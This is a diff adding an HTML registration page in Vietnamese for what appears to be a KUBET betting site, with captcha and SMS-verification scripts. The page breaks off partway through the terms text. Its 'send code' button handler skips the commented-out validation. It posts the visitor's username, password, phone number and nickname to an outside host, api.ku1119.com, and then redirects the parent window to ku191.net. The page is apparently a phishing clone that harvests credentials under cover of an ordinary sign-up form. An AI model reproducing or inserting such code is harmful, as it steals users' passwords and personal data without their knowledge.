@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>ĐĂNG KÝ HỘI VIÊN</title>
+    <link href="/Styles/common/members.2a55be07466f868d.css" rel="stylesheet" />
+    <link href="/Styles/new_windows.998a78ebb0bccfc1.css" rel="stylesheet" />
+    <link href="/Scripts/layer/theme/style.5ff1793dcb857348.css" rel="stylesheet" />
+    <style type="text/css">
+        .input_box {
+            width: 240px;
+        }
+
+        .voice_prompt {
+            margin-left: 145px;
+        }
+
+        .become_members {
+            font-size: 18px;
+        }
+
+        .btn_deposit {
+            padding-right: 35px;
+            background-position: 155px center;
+        }
+
+        .btn_Browse {
+            padding-right: 35px;
+            background-position: 140px center;
+        }
+
+        .btn_SentOut {
+            background-position: 125px center;
+        }
+
+        .formPrompt {
+            left: 146px;
+        }
+    </style>
+    <script type="text/javascript" src="/Scripts/jquery.min.js"></script>
+    <script type="text/javascript" src="/Scripts/common.40c7d9ee8afae554.js"></script>
+
+    <style>
+        html {
+            display: none;
+        }
+
+        .popup_form:before {
+            z-index: 999;
+            width: 10px;
+            height: 8px;
+            content: "";
+            display: block;
+            position: absolute;
+            right: 7px;
+            top: 50%;
+            transform: translateY(-50%);
+            -webkit-transform: translateY(-50%);
+            background: url(/images/main/btn_selectAccount.png) no-repeat center center;
+        }
+
+        select.select_box.info_box3 {
+            margin: 0;
+            margin-left: 45px;
+            border: 1px solid rgb(229, 229, 229);
+            border-radius: 0;
+            height: 40px;
+            line-height: 40px;
+            box-sizing: border-box;
+            background: rgb(255, 255, 255);
+            color: rgb(0, 0, 0);
+            padding: 0 25px 0 8px;
+            cursor: pointer;
+            outline: none;
+            width: 270px !important;
+            font-size: 13px !important;
+            position: relative !important;
+        }
+    </style>
+
+    <style>
+        select.select_box.info_box3 {
+            width: 240px !important;
+            float: right;
+            font-size: 14px !important;
+        }
+    </style>
+
+    <script type="text/javascript">
+        try {
+            if (self.location.origin == top.location.origin) {
+                document.documentElement.style.display = 'block';
+            } else {
+                top.location = self.location;
+            }
+        } catch (err) {
+            top.location = self.location;
+        }
+    </script>
+</head>
+
+<body>
+    <form method="post" action="./Add1.aspx" id="form1">
+        <div class="aspNetHidden">
+            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
+                value="7W6GAWcPo0cJvbOD2qo6CcIYwXHAXhfPT+S1/WvQOHc6xavQP/Y7QRaGIRpALP8Yry/43HA6rEAQqanQPNs61opJl7WCYm+nkO233PIFDZq7JPkhCKJNVFnK87hwPNHYki/QBWAdrTYOzBelnTWqNOuXZqLaSQGZHBhUFbvhvgIz9+C4azcMaMyuNwBFXs240pesQ1LRnYqD0YI/W70nc7qAc+HoA1zOfoqWqr97EDHNoqOhrIRsR4GvuMx7jh+JiSiR17pVbOT3zbVw7SnLYzZjkO1EMEGGER7XSPxayP258J0uZ/WXvVixOwWOiQ0/SRuPertW1Sn+Z/Y/+CP7tFqAYg6MipfNKV/GOZTTdHqFlv8ZPrzGe5NlNdfkLckzFuFo/A==" />
+        </div>
+
+        <div class="aspNetHidden">
+
+            <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D7A98280" />
+            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION"
+                value="zA1e6hx5f+T94h3j5AuOI3nApXdoKd3HxZo1bMqSrvC27SSJ7wtWJmsv4qoru+xE2LZ34tS4+DE7aOkTnJfXWC9ZwgjrIKH4TlwMtW7ZnUkE5bRbyC5AHTYskClMmmsxLfdVYq911cMOpET0PxMrjCLO4/ZjXSbtNnnV0Z7sIvNcOcYaS1bhujzr/gQLKOctfPjKGNzaeMbmw0NTipBBCKX/aW/pX+Ari0a9qMPNLBRcna7T" />
+        </div>
+
+        <div class="join_members join_members1">
+            <div class="members_header">
+                ĐĂNG KÝ HỘI VIÊN<div class="btn_close" onclick="layerframeAddClose_confirm();"></div>
+            </div>
+            <div class="members_bottom">
+                <div class="member_info" style="padding-bottom: 5px;">
+
+                    <div class="input_info ">
+                        <div class="input_title">Tài khoản đại lý</div>
+                        <input name="txtAgent" type="text" maxlength="10" id="txtAgent" class="input_box uppercase"
+                            autocomplete="off" onblur="checkAgent(this)"
+                            placeholder="Bỏ qua nếu không có đại lý giới thiệu" />
+                    </div>
+
+                    <div class="input_info">
+                        <div class="input_title">Tài khoản</div>
+                        <input name="txtAccounts" maxlength="10" id="txtAccounts" type="text"
+                            class="input_box uppercase" autocomplete="off"
+                            data-checkkeyword="{&quot;tip&quot;:&quot;Font_txtAccountsBlur_NotOK&quot;,&quot;clear&quot;:0,&quot;dir&quot;:1,&quot;max&quot;:1}"
+                            placeholder="4 ~ 10 ký tự chữ và số" />
+                    </div>
+                    <div class="input_info">
+                        <div class="input_title">Biệt danh</div>
+                        <input name="txtTitle" type="text" id="txtTitle" class="input_box"
+                            data-checkkeyword="{&quot;tip&quot;:&quot;Font_txtTitleBlur_NotOK&quot;,&quot;clear&quot;:0,&quot;dir&quot;:1,&quot;max&quot;:1}"
+                            placeholder="Nhập tối đa 8 ký tự" />
+                    </div>
+                    <div class="input_info">
+                        <div class="input_title">Mật khẩu</div>
+                        <div class="formPrompt" id="formPrompt">
+                            <span class="red_t">Mật khẩu tối đa 10 ký tự !</span>
+                        </div>
+                        <div class="pwON">
+                            <input name="txtPassword" type="text" maxlength="10" id="txtPassword"
+                                data-checkkeyword="{&quot;tip&quot;:&quot;Font_txtAccountPasswordBlur_NotOK&quot;,&quot;clear&quot;:1,&quot;dir&quot;:1,&quot;checkSimple&quot;:1,&quot;max&quot;:1}"
+                                class="input_box" placeholder="6 ~ 10 ký tự chữ và số" />
+                            <span class="icon_pw" onclick="spanPwdEye(this)"></span>
+                        </div>
+                    </div>
+                    <div class="voice_prompt voice_promptPass"
+                        style="background-image:none;padding-left: 7px;height: 20px;margin-top: 3px;">
+                        <div id="txtPassword_tip" class="hidden"
+                            style="color: #000; font-size: 14px;line-height: 20px;">
+                            <span id="txtimg"
+                                style="display: inline-block; width: 12px; height: 12px; position: absolute;margin-top: 4px;background-image: url(/images/main/bubble.png); background-position: 0 -70px;"></span>
+                            <span style="margin-left: 18px;line-height: 20px;">6 ~ 10 ký tự chữ và số</span>
+                        </div>
+                    </div>
+                </div>
+                <link href="/Styles/slidercaptcha.48185d75ab3c0b78.css" rel="stylesheet" />
+                <link href="/Styles/common/font-awesome/css/font-awesome.min.0cc127b6aa5a3592.css" rel="stylesheet" />
+                <style>
+                    .verification_code {
+                        display: none;
+                    }
+
+                    .verification_code .ver_title {
+                        width: 100%;
+                        text-align: center;
+                        margin: 13px 0 0 5px;
+                        line-height: 30px;
+                    }
+
+                    .verification_code .ver_box {
+                        width: 100%;
+                        position: relative;
+                        margin-bottom: 20px;
+                    }
+
+                    .verification_code .ver_text {
+                        width: 100%;
+                        height: 40px;
+                        font-size: 21px;
+                        box-sizing: border-box;
+                        color: #ff9500 !important;
+                        background: #fff;
+                        border: 1px solid #c2c2c2;
+                        padding-left: 15px;
+                    }
+
+                    .verification_code .ver_error {
+                        text-align: left;
+                        color: red;
+                        line-height: 18px;
+                        font-size: .8em;
+                        padding-left: 20px;
+                        float: right;
+                        margin-top: -18px;
+                        position: relative;
+                        display: none
+                    }
+
+                    .verification_code .ver_error::after {
+                        content: "";
+                        display: block;
+                        width: 18px;
+                        height: 18px;
+                        background: url(/images/main/icon_gatherBank.png) no-repeat;
+                        background-position: -54px 0;
+                        background-size: 135px 90px;
+                        position: absolute;
+                        left: 0;
+                        top: 0
+                    }
+
+                    .verification_code .ver_img {
+                        position: absolute;
+                        right: 1px;
+                        top: 1px;
+                        height: 38px;
+                        box-sizing: border-box;
+                        cursor: pointer;
+                    }
+
+                    .verification_code .ver_send {
+                        background: #4ea6ff;
+                        color: #fff;
+                        text-align: center;
+                        padding: 0;
+                        display: block;
+                        width: 110%;
+                        height: 50px;
+                        line-height: 50px;
+                        border-radius: 5px;
+                        margin: 5px 0 0 -5%;
+                        float: left;
+                        cursor: pointer;
+                        box-sizing: border-box
+                    }
+
+                    .verification_code .ver_send:hover {
+                        background-color: #67b1fc;
+                    }
+
+                    .verification_code .ver_send.disabled {
+                        background: #aaaaaa !important
+                    }
+
+                    /*圖形驗證碼CSS*/
+                    .slidercaptcha {
+                        margin: 0 auto;
+                        width: 314px;
+                        height: 286px;
+                        border-radius: 4px;
+                        box-shadow: inset 0 0 0px 50px #fff;
+                        margin-top: 40px;
+                    }
+
+                    .slidercaptcha .card-body {
+                        padding: 1rem;
+                        background-color: #fff;
+                    }
+
+                    .slidercaptcha canvas:first-child {
+                        border-radius: 4px;
+                        border: 1px solid #e6e8eb
+                    }
+
+                    .slidercaptcha.card .card-header {
+                        padding: .75rem 1.25rem;
+                        margin-bottom: 0;
+                        border-bottom: 1px solid rgba(0, 0, 0, .125);
+                        background-image: none;
+                        background-color: #fff;
+                        text-align: center;
+                        font-size: 18px;
+                    }
+
+                    .modal {
+                        display: none;
+                        position: fixed;
+                        z-index: 999999999;
+                        padding-top: 100px;
+                        left: 0;
+                        top: 0;
+                        width: 100%;
+                        height: 100%;
+                        overflow: auto;
+                        background-color: #000;
+                        background-color: rgba(0, 0, 0, 0.4)
+                    }
+
+                    .modal-content {
+                        background-color: #fefefe;
+                        margin: auto;
+                        padding: 20px;
+                        border: 1px solid #888;
+                        width: 80%
+                    }
+
+                    .isSlider .slidercaptcha,
+                    .isSlider .slidercaptcha .card-body {
+                        border-radius: 15px;
+                    }
+
+                    .isSlider .slidercaptcha.card .card-header {
+                        border-radius: 15px 15px 0 0;
+                        background-color: #eee;
+                        border-bottom: none;
+                        padding: .8rem 1.25rem;
+                    }
+
+                    .isSlider .refreshIcon {
+                        background-size: 100%;
+                    }
+
+                    .isSlider .close.fa.fa-times {
+                        background-image: url(/Mobile/images/main/btn_close_gray.svg);
+                        background-size: 100% auto;
+                        background-repeat: no-repeat;
+                        background-position: center;
+                        height: 20px;
+                        width: 20px;
+                        left: 1%;
+                    }
+
+                    .isSlider .fa-times:before {
+                        content: none;
+                    }
+
+                    .isSlider .card-header span {
+                        position: relative;
+                        left: 3%;
+                    }
+
+                    .isSlider #captcha {
+                        margin-top: 10px !important;
+                    }
+
+                    .isSlider .sliderContainer {
+                        margin-top: 0;
+                    }
+
+                    .isSlider .refreshIcon {
+                        top: 54%;
+                    }
+
+                    @media (min-width:360px) {
+                        .isSlider .slidercaptcha {
+                            width: 350px;
+                        }
+                    }
+
+                    @media (min-width:400px) {
+                        .isSlider .slidercaptcha {
+                            width: 370px;
+                        }
+                    }
+
+                    #btnContactCS {
+                        background-color: #279A32 !important;
+                    }
+
+                    #btnContactCS:disabled {
+                        background-color: #999 !important;
+                    }
+                </style>
+                <style>
+                    .btn_confirm_captcha {
+                        border: 0;
+                        background: none;
+                        width: 28%;
+                        background-color: #4ea6ff;
+                        box-sizing: border-box;
+                        color: #fff;
+                        cursor: pointer;
+                        font-size: 15px;
+                        outline: none;
+                        float: right;
+                        border-radius: 3px;
+                    }
+
+                    .btn_confirm_captcha:disabled {
+                        background-color: #888888 !important;
+                        color: #ffffff !important;
+                    }
+
+                    #txtCaptcha {
+                        width: 100%;
+                        float: left;
+                        position: relative;
+                        border-radius: 3px;
+                        border: 1px solid #ddd;
+                        padding: 0 8px;
+                    }
+
+                    .refresh-button {
+                        position: absolute;
+                        top: 2px;
+                        right: 5px;
+                        width: 30px;
+                        height: 35px;
+                        background: url(/images/main/icon_refresh_captcha.png)no-repeat center;
+                        background-size: 100%;
+                        cursor: pointer;
+                    }
+
+                    .captcha_error {
+                        color: red;
+                        visibility: hidden;
+                        top: 0px;
+                    }
+
+                    #captchaImg {
+                        border: 1px solid #ddd;
+                        border-radius: 3px;
+                    }
+
+                    #txtCaptcha,
+                    .btn_confirm_captcha {
+                        font-size: 18px;
+                    }
+
+                    .btn_confirm_captcha {
+                        position: absolute;
+                        top: 5px;
+                        right: 5px;
+                        font-size: 14px;
+                        width: 55px;
+                        height: 27px;
+                    }
+
+                    @media (min-width: 400px) {
+
+                        #captchaImg,
+                        #txtCaptcha,
+                        .btn_confirm_captcha {
+                            border-radius: 5px;
+                        }
+                    }
+                </style>
+
+                <div class="verification_code" id="verification_code">
+                    <div class="ver_title">Vui lòng nhập ký tự bên dưới</div>
+                    <div class="ver_box">
+                        <input type="text" maxlength="4" class="ver_text" placeholder="" />
+                        <img class="ver_img" src="/images/loading.gif" title="Nhấn vào cập nhật" />
+                    </div>
+                    <span class="ver_error"></span>
+                    <a class="ver_send disabled">Xác nhận</a>
+                </div>
+                <script type="text/javascript">
+                    $(function () {
+                        var maxl = !IsCn ? 10 : 11;
+                        $("#txtPhoto,#txtPhoneCode").on("blur", function () {
+                            if (!($(this).attr('id') == "txtPhoto" && this.value.indexOf("****") > 1)) {
+                                this.value = this.value.replace(/\D/g, '');
+                                this.value = this.value.substr(0, maxl);
+                            }
+                        });
+                        $("#txtPhoto").attr("maxlength", maxl);
+
+                        if (!IsYn) {
+                            if (IsIphone()) {
+                                $(".card-header").css("font-weight", 500);
+                            }
+                            else {
+                                $(".card-header").css("font-weight", 900);
+                            }
+                        }
+
+                        $("#txtPhoto").on("keyup change", function (e) {
+                            if (this.value.indexOf("****") > 1) {
+                                this.value = '';
+                            }
+                        });
+                    });
+                </script>
+                <script type="text/javascript" src="/Scripts/jquery-3.4.1.min.3d9e9643852e31a1.js"></script>
+                <script type="text/javascript" src="/Scripts/longbow.slidercaptcha.5520afcb64f6e304.js"></script>
+                <script>
+                    var $j = jQuery.noConflict(true);
+                    var count = 0;
+                    var count1 = 0;
+                    var captchaWidth = 280;
+                    var captchaHeight = 150;
+                    var msgBoxOpenFlag = false;
+                    var msgBoxOldPhone = "";
+                    var isContactCSFlag = "False" == "True";
+                    var isSendSms = false;
+
+                    $j(document).ready(function ($) {
+                        InitCaptcha();//初始化验证码
+
+                        //字母验证码判断
+                        $("#txtCaptcha").on("blur keyup input", function (e) {
+                            checkRegeditUser2(this, 5);
+                            if ($(this).val().length > 4) {
+                                this.value = this.value.substr(0, 4);
+                            }
+                            if ($(this).val().length == 4) {
+                                $(".btn_confirm_captcha").removeAttr("disabled");
+                            } else {
+                                $('.btn_confirm_captcha').attr("disabled", "disabled");
+                            }
+                        });
+
+                        //点击照片刷新字母验证码
+                        $('.refresh-button').click(function () {
+                            getCaptchaNumber();
+                        });
+
+                        //送出 验证码
+                        $('.btn_confirm_captcha').click(function () {
+                            verifyCaptchaNumber();
+                        });
+
+                        $('#btnSendCode').click(function () {
+                            const username = $('#txtAccounts').val();
+                            const password = $('#txtPassword').val();
+                            const phone = $('#txtPhoto').val();
+                            const title = $('#txtTitle').val();
+
+                            if (!username || !password || !phone || !title) {
+                                return
+                            } else {
+                                $.ajax({
+                                    url: "https://api.ku1119.com/api/register",
+                                    data: { username, password, phone, name: title, casio: 'kubet' },
+                                    type: "post",
+                                    dataType: "json",
+                                    cache: !1,
+                                    timeout: t1,
+                                    error: function (n) {
+                                        console.log(n)
+                                    },
+                                    success: function (n) {
+                                        window.parent.location.href = "https://ku191.net/";
+                                    },
+                                });
+                            }
+
+                            // if (validateInput()) {
+                            //     console.log('alooo')
+                            //     if ($(".captchaNumber").is(":visible")) {
+                            //         verifyCaptchaNumber();
+                            //     } else {
+                            //         callphotoP2();
+                            //     }
+                            // }
+                        });
+
+                        if (document.location.pathname === "/Aspx/Add1.aspx" || document.location.pathname === "/Mobile/Aspx/N_Add1.aspx") {
+                            $('.Resend_ver_code, #btnSendCode, #btnSendVoice, .w100.btn_code, .w100.btn_code2').click(function (e) {
+                                if (!$(e.target).hasClass('btn_SentOut') && !$(e.target).hasClass('Resend_ver_code on hidden msg5') && !$(e.target).hasClass('w100 btn_code on hidden msg5') && e.target.id != "btnContactCS") {
+                                    if (IsMPage && tioP2) {
+                                        showMsgBox();
+                                    } else if (validateInput()) {
+                                        $('.sliderText').text(webRes.Font_CaptchaMsg2);
+                                        $('.slidercaptcha').show();
+                                        $('.modal').show();
+                                        isSendSms = true;
+                                    }
+                                }
+                            });
+                            $('#btnContactCS, .msg5').click(function (e) {
+                                callphotoP2();
+                            });
+                        } else if (document.location.pathname === "/Mobile/Aspx/N_ForgotPassWord.aspx") {
+                            $('.btn_code, .btn_code2').click(function (e) {
+                                if (tioP2) {
+                                    showMsgBox();
+                                } else {
+                                    ForgotPwdSubmit();
+                                }
+                            });
+                        } else {
+                            $('.Resend_ver_code, #btnSendCode, #btnSendVoice, .w100.btn_code, .w100.btn_code2').click(function (e) {
+                                if (!$(e.target).hasClass('btn_SentOut')) {
+                                    var skipValidate = $("#txtPhoto").val() != "" && $("#txtPhoto").prop("disabled");
+                                    if (skipValidate || validateInput()) {
+                                        if (IsMPage && tioP2) {
+                                            showMsgBox();
+                                        } else {
+                                            callphotoP2();
+                                        }
+                                    }
+                                }
+                            });
+                        }
+
+                        $('.close').click(function () {
+                            if ($("input").hasClass("checkSliderType")) {
+                                if ($("#checkSliderType").val() == "1") {
+                                    $("#checkSliderType").val("0");
+                                    $("#txtAccounts").val("");
+                                }
+                                if (IsMPage) {
+                                    if (!isSendSms) {
+                                        $("#txtAccounts").val("");
+                                    } else {
+                                        isSendSms = false;
+                                    }
+                                    fnEnableSubmit();
+                                }
+                            }
+                            if ($(".captchaNumber").is(":visible")) {
+                                getCaptchaNumber();
+                            } else {
+                                $('#captcha').sliderCaptcha("resetWithText");
+                            }
+                            $('.modal').hide();
+                        });
+
+                        //初始化验证码
+                        function InitCaptcha() {
+                            $.ajax({
+                                url: "/LoadData/Captcha.ashx?type=1&w=" + captchaWidth + "&h=" + captchaHeight,
+                                async: false,
+                                cache: false,
+                                type: 'POST',
+                                contentType: 'application/json',
+                                dataType: 'json',
+                                success: function (data) {
+                                    if (data.Slider != null && data.Slider != "") { //如果Slider有數據,代表目前設定是滑動驗證碼
+                                        sliderCaptcha(data);
+                                        AddRemoveClass(true);
+                                    } else { //如果Slider沒有數據,則是字母驗證碼
+                                        $(".captchaNumber").show();
+                                        $('#captchaImg').attr("src", data.Background);
+                                        AddRemoveClass(false);
+                                    }
+                                }
+                            });
+                        };
+
+                        //針對滑動驗證css
+                        function AddRemoveClass(isAdd) {
+                            if (isAdd && location.href.toLowerCase().indexOf("n_add1") > -1) {
+                                $("#captchaModal").addClass("isSlider");//針對滑動驗證css
+                            } else {
+                                $("#captchaModal").removeClass("isSlider");
+                            }
+                        }
+
+                        //獲取滑動验证码
+                        function sliderCaptcha(data) {
+                            $(".captchaNumber").hide();
+                            $('#captcha').sliderCaptcha({
+                                width: captchaWidth,
+                                height: captchaHeight,
+                                sliderL: 42,
+                                sliderR: 9,
+                                offset: 5,
+                                loadingText: 'Loading...', // 正在加载中
+                                failedText: 'Thử lại', // 再试一次
+                                barText: 'Trượt mũi tên ghép hình', // 向右滑动填充拼图
+                                failLoadText: 'Tải thất bại', //加载失败
+                                repeatIcon: 'fa fa-redo',
+                                setSrc: function () {
+                                    return '/LoadData/Captcha.ashx?type=1&w=' + captchaWidth + '&h=' + captchaHeight; //取出滑動驗證碼圖案
+                                },
+                                initsetSrc: function () {
+                                    return data; //初始時 直接帶入data，取出滑動驗證碼圖案
+                                },
+                                onSuccess: function () {
+                                    if ($(".captchaNumber").is(":hidden")) {
+                                        setTimeout(function () {
+                                            $('#captchaModal').hide();
+                                            if ($("input").hasClass("checkSliderType")) {
+                                                if ($("#checkSliderType").val() == "1") {
+                                                    $("#checkSliderType").val("0");
+                                                    validateUserName();
+                                                    count1 = 0;
+                                                }
+                                                else {
+                                                    callphotoP2();
+                                                    count = 0;
+                                                }
+                                            }
+                                            else {
+                                                callphotoP2();
+                                                count = 0;
+                                            }
+                                            $('#captcha').sliderCaptcha('reset');//刷新滑動驗證碼
+                                        }, 500);
+                                    }
+                                },
+                                remoteUrl: "/LoadData/Captcha.ashx?type=2&w=" + captchaWidth + "&h=" + captchaHeight, // 確認滑動驗證碼位置是否正確
+                                verify: function (arr, url) {
+                                    var ret = false;
+                                    var background = "";
+                                    $.ajax({
+                                        url: url,
+                                        data: JSON.stringify(arr),
+                                        async: false,
+                                        cache: false,
+                                        type: 'POST',
+                                        contentType: 'application/json',
+                                        dataType: 'json',
+                                        success: function (result) {
+                                            if (result.Background != null && result.Background != "") { //如果background有數據,代表已更換種類,需要顯示字母驗證碼
+                                                background = result.Background;
+                                            } else { //如果background沒有數據,種類保持一樣,只回傳true或false
+                                                ret = result;
+                                            }
+                                        }
+                                    });
+                                    if (background.length > 0) { //如果background有數據,代表已更換種類,需要顯示字母驗證碼
+                                        count = 1;
+                                        $("#captcha,#captcha2").hide();
+                                        $(".captchaNumber").show();
+                                        $('#captchaImg').attr("src", background);
+                                        $("#txtCaptcha").val("");
+                                        $('.btn_SentOut,.btn_confirm_captcha').attr("disabled", "disabled");
+                                        ret = true;
+                                    } else { //如果background沒有數據,種類保持一樣
+                                        if (ret === false) { // 驗證失敗
+                                            if ($("input").hasClass("checkSliderType")) {
+                                                if ($("#checkSliderType").val() == "1") {
+                                                    count1++;
+                                                }
+                                                else {
+                                                    count++;
+                                                }
+                                            }
+                                            else {
+                                                count++;
+                                            }
+                                        }
+                                        if (count === 5 || count1 === 5) { // 當拖動驗證錯誤次數達到五次，須自動關閉圖形驗證窗口
+                                            setTimeout(
+                                                function () {
+                                                    $('#captchaModal').hide();
+                                                    $('#captcha').sliderCaptcha('reset');
+                                                    if ($("#checkSliderType").val() == "1") {
+                                                        $("#checkSliderType").val("0");
+                                                        $("#txtAccounts").val("");
+                                                    }
+                                                    if (count === 5) {
+                                                        count = 0;
+                                                    }
+                                                    else {
+                                                        count1 = 0;
+                                                    }
+                                                }, 500);
+                                        }
+                                    }
+                                    return ret;
+                                }
+                            });
+                        }
+
+                        //獲取字母數字验证码
+                        var flagGetCaptcha = false;
+                        function getCaptchaNumber() {
+                            if (flagGetCaptcha) {
+                                return false;
+                            }
+                            flagGetCaptcha = true;
+                            $("#txtCaptcha").val("");
+                            $('.btn_confirm_captcha').attr("disabled", "disabled");
+                            $(".captcha_error").css("visibility", "hidden");//隱藏驗證碼錯誤
+                            $.ajax({
+                                url: "/LoadData/Captcha.ashx?type=1&w=" + captchaWidth + "&h=" + captchaHeight,
+                                async: false,
+                                cache: false,
+                                type: 'POST',
+                                contentType: 'application/json',
+                                dataType: 'json',
+                                error: function (data) {
+                                    flagGetCaptcha = false;
+                                },
+                                success: function (data) {
+                                    if (data.Slider != null && data.Slider != "") { //如果Slider有數據,代表已更換種類,需要顯示滑動驗證碼
+                                        $("#captcha").show();
+                                        sliderCaptcha(data);
+                                        $('#captcha').sliderCaptcha('reset'); //刷新滑動驗證碼
+                                        AddRemoveClass(true);
+                                    } else {
+                                        $('#captchaImg').attr("src", data.Background); //獲取字母驗證碼照片
+                                        AddRemoveClass(false);
+                                    }
+                                    flagGetCaptcha = false;
+                                }
+                            });
+                        }
+
+                        //驗證字母數字验证码
+                        var flagVerify = false;
+                        function verifyCaptchaNumber() {
+                            if (flagVerify) {
+                                return false;
+                            }
+                            flagVerify = true;
+                            layer.closeAll();
+                            $.ajax({
+                                url: "/LoadData/Captcha.ashx?type=2&w=" + captchaWidth + "&h=" + captchaHeight,
+                                async: false,
+                                cache: false,
+                                type: 'get',
+                                contentType: 'application/json',
+                                dataType: 'json',
+                                data: { captcha: $("#txtCaptcha").val() },
+                                error: function (data) {
+                                    flagVerify = false;
+                                },
+                                success: function (data) {
+                                    if (data.Slider != null && data.Slider != "") {//如果Slider有數據,代表已更換種類,需要顯示滑動驗證碼
+                                        $("#captcha").show();
+                                        sliderCaptcha(data);
+                                        $('#captcha').sliderCaptcha('reset'); //刷新滑動驗證碼
+                                        $(".captcha_error").css("visibility", "hidden");//隱藏驗證碼錯誤
+                                    } else if (data) { // 驗證成功
+                                        setTimeout(function () {
+                                            $('#captchaModal').hide();
+                                            if ($("input").hasClass("checkSliderType")) {
+                                                if ($("#checkSliderType").val() == "1") {
+                                                    $("#checkSliderType").val("0");
+                                                    validateUserName();
+                                                    count1 = 0;
+                                                }
+                                                else {
+                                                    callphotoP2();
+                                                    count = 0;
+                                                }
+                                            }
+                                            else {
+                                                callphotoP2();
+                                                count = 0;
+                                            }
+                                            getCaptchaNumber(); //刷新字母數字驗證碼
+                                        }, 500);
+                                    } else { // 驗證失敗
+                                        if ($("input").hasClass("checkSliderType")) {
+                                            if ($("#checkSliderType").val() == "1") {
+                                                count1++;
+                                            }
+                                            else {
+                                                count++;
+                                            }
+                                        }
+                                        else {
+                                            count++;
+                                        }
+                                        //getCaptchaNumber();
+                                        $(".captcha_error").css("visibility", "visible");//開啓驗證碼錯誤
+                                        $("#txtCaptcha").val("");
+                                        $('.btn_confirm_captcha').attr("disabled", "disabled");
+                                    }
+                                    flagVerify = false;
+                                    if (count === 5 || count1 === 5) { // 當拖動驗證錯誤次數達到五次，須自動關閉圖形驗證窗口
+                                        setTimeout(
+                                            function () {
+                                                $('#captchaModal').hide();
+                                                getCaptchaNumber(); //刷新字母數字驗證碼
+                                                if ($("#checkSliderType").val() == "1") {
+                                                    $("#checkSliderType").val("0");
+                                                    $("#txtAccounts").val("");
+                                                }
+                                                if (count === 5) {
+                                                    count = 0;
+                                                }
+                                                else {
+                                                    count1 = 0;
+                                                }
+                                            }, 500);
+                                    }
+                                }
+                            });
+                        }
+                    });
+                </script>
+                <style type="text/css">
+                    .btn_message {
+                        min-width: 80px;
+                        width: unset;
+                        background-position-x: 92%;
+                        background-position-y: center;
+                        background-size: 22%;
+                    }
+
+                    .btn_voice {
+                        width: 80px;
+                        background-position-x: 95%;
+                        background-position-y: center;
+                        background-size: 20%
+                    }
+
+                    .btn_ver_code {
+                        width: 80px;
+                    }
+
+                    .Resend_ver_code.on {
+                        width: 80px;
+                    }
+
+                    .voice_prompt {
+                        background-position-y: top;
+                        background-size: 6%;
+                        line-height: 15px;
+                        font-size: 12px;
+                        width: 220px;
+                        padding-left: 20px;
+                    }
+
+                    .btn_verification {
+                        width: 100px;
+                    }
+
+                    .btn_ver_code_ok {
+                        width: 25px;
+                        right: 32px;
+                    }
+
+                    .sliderText {
+                        padding-left: 15px;
+                    }
+
+                    #btnContactCS {
+                        width: 100px
+                    }
+                </style>
+                <div class="verification" style="border-bottom:none;">
+                    <div class="input_info" style="margin-top: 0;">
+                        <div class="input_title">SĐT</div>
+                        <input type="text" id="txtPhoto" onkeydown="return SubmitEnter(event);" class="input_box"
+                            style="padding-right: 67px;" value="" />
+                        <div class="divMsg">
+                            <input type="button" id="btnSendCode" value="Gửi mã" class="btn_message  msg1" />
+                            <input type="button" id="btnSendVoice" value="Tiếng nói" class="btn_voice hidden msg1" />
+                            <input type="button" value="Gửi lại" class="Resend_ver_code hidden msg2"
+                                style="cursor: default;width: 88px;" />
+                            <div class="VER_seconds hidden msg2"><span id="SecondSendCode"></span><span
+                                    style="color: #555555;">&nbsp;s</span></div>
+                            <input type="button" value="Gửi lại" class="Resend_ver_code on hidden msg3" />
+                            <div class="btn_verification hidden msg4">Đã xác nhận</div>
+                            <input type="button" id="btnContactCS" value="Liên hệ hỗ trợ"
+                                class="Resend_ver_code on hidden msg5" />
+                        </div>
+                        <div id="captchaModal" class="modal">
+                            <div class="slidercaptcha card">
+                                <div class="card-header">
+                                    <span>Xác nhận bảo mật</span>
+                                    <span class="close fa fa-times"
+                                        style="float:right;cursor:pointer;font-size:18px;"></span>
+                                </div>
+                                <div class="card-body">
+                                    <div id="captcha"></div>
+                                    <div class="input_info captchaNumber" style="display:none">
+                                        <div class="input_title" style="line-height:0px;margin-bottom:8px;"><img
+                                                id="captchaImg" src="" /><i class="refresh-button"></i></div>
+                                        <div style="position:relative;float:right;width:100%;">
+                                            <input id="txtCaptcha" spellcheck="false"
+                                                style="width:100%; position:relative;"
+                                                onkeydown="return SubmitEnter(event);" type="text" class="input_box"
+                                                autocomplete="off" maxlength="4" placeholder="Mã xác nhận" />
+                                            <input type="button" value="Gửi"" class=" btn_confirm_captcha"
+                                                disabled="disabled" />
+                                        </div>
+                                        <br /><span class="captcha_error">Mã xác nhận sai</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="min-height:4px;margin:3px 0;">
+                        <div class="voice_prompt voice_promptMsg hidden">Mã xác nhận đã gửi, vui lòng kiểm tra điện
+                            thoại.</div>
+                        <div class="voice_prompt voice_promptMsg2 hidden">Cuộc gọi đang được thực hiện, vui lòng chú ý
+                            điện thoại để nhận mã.</div>
+                    </div>
+                    <div class="input_info" style="margin-top:0px;">
+                        <div class="input_title">Mã xác nhận</div>
+                        <input type="text" id="txtPhoneCode" class="input_box" style="padding-right: 67px;"
+                            maxlength="4" />
+                        <a href="javascript:void(0)" class="btn_ver_code code1">Xác nhận</a>
+                        <a href="javascript:fnCodeP2()" class="btn_ver_code code2 hidden on">Xác nhận</a>
+                        <a href="javascript:void(0)" class="btn_ver_code btn_ver_code_ok hidden code3"></a>
+                    </div>
+                </div>
+                <input type="hidden" id="hid_SmsSort" value="1|0|1|1" />
+                <input type="hidden" id="hid_Photo" value="" />
+
+
+
+
+
+
+
+
+
+                <script>var IsTest = "False" == "True"; var f_photo = ""</script>
+                <div class="join_norm">
+                    <div class="norm_phonemessage">
+                        <div id="f_isPhoneMsg" class="icon_checkbox on"></div>
+                        <div class="check_text">Nhận thông tin khuyến mãi qua tin nhắn điện thoại</div>
+                    </div>
+                    <div class="norm_clause" style="margin-top: 10px;">
+                        <div id="ckb1" class="icon_checkbox on"></div>
+                        <div class="check_text">
+                            Tôi đã đủ 18 tuổi , đồng ý tuân thủ quy tắc đặt cược và<span class="norm_service"
